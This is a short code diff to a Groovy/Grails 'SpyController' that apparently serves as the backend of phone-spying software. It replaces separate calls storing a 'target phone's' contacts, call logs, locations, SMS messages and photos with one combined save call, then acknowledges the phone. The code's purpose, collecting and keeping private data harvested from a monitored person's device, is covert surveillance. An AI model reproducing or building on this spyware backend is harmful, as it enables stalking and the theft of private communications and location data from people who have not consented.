@@ -8,7 +8,6 @@ import org.codehaus.jackson.map.JsonMappingException
 
 import redis.clients.jedis.Jedis
 
-import com.xaviar.domain.TargetPhone
 import com.xaviar.domain.User
 import com.xaviar.market.rest.item.DataHolder
 
@@ -43,31 +42,8 @@ class SpyController {
 					//Redis testing data
 					//addAllToRedis(dataHolder)
 
-					TargetPhone targetPhone = TargetPhone.findBySimSubscriberId(authSimSubscriberId);
-
-					//target phone parameters
-					targetPhoneService.addPhoneParams(dataHolder, authSimSubscriberId,authUser)
-
-					//target phone contacts
-					targetPhoneService.addContacts(dataHolder, targetPhone)
-
-					//target phone call logs
-					targetPhoneService.addCallLogs(dataHolder, targetPhone)
-
-					//target phone call log events
-					targetPhoneService.addCallLogEvents(dataHolder, targetPhone)
-
-					//target phone location events
-					targetPhoneService.addLocationEvents(dataHolder, targetPhone)
-
-					//target phone smses
-					targetPhoneService.addSmses(dataHolder, targetPhone)
-
-					//target phone sms events
-					targetPhoneService.addSmsEvents(dataHolder, targetPhone)
-
-					//target phone album pictures
-					targetPhoneService.addPictures(dataHolder, targetPhone)
+					//save dataholder retrieve data
+					targetPhoneService.save(dataHolder, authSimSubscriberId,authUser);
 
 					//send ok message to phone
 					dataHolder.setID(200);
